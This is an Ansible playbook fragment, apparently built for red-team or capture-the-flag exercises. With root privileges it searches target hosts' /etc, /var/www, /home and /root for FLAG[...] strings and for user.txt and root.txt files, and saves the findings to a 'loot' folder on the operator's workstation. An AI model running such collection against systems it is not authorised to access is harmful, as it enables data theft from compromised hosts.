---
- name: Create local loot directory
  delegate_to: localhost
  file:
    path: "{{ playbook_dir }}/loot/{{ inventory_hostname }}"
    state: directory
    mode: '0755'
  become: no

- name: Targeted Flag Extraction
  become: yes
  shell: |
    # 1. Search for FLAG[...] pattern - Skip binaries (-I) and limit line length
    grep -rEIo "FLAG\[[^]]+\]" /etc /var/www /home /tmp 2>/dev/null | cut -c 1-200 || true

    # 2. Find common flag files - Exclude images and limit to small text files
    find /root /home /var/www -maxdepth 4 -size -100k -type f \( -name "*flag*" -o -name "user.txt" -o -name "root.txt" \) \
    ! -path "*.png" ! -path "*.jpg" ! -path "*.gif" ! -path "*.ico" ! -path "*.svg" 2>/dev/null | \
    xargs -I {} sh -c 'echo "{}: $(tr -cd "[:print:]" < {} | head -c 100)"' || true
  register: fs_matches
  failed_when: false
  changed_when: false

- name: Save findings to Red Team Workstation
  delegate_to: localhost
  copy:
    content: |
      === TARGETED FLAG REPORT: {{ inventory_hostname }} ===
      [TIMESTAMP: {{ ansible_date_time.iso8601 if ansible_date_time is defined else "N/A" }}]
      
      [DETECTION RESULTS]
      {{ fs_matches.stdout if fs_matches.stdout != "" else "No valid flags found." }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/flags_report.txt"
  become: no

- name: LIVE FLAG ALERT
  debug:
    msg: 
      - "--- FLAGS DETECTED ON {{ inventory_hostname }} ---"
      - "{{ fs_matches.stdout_lines if fs_matches.stdout != '' else ['CLEAN: No flags found in text-based scans'] }}"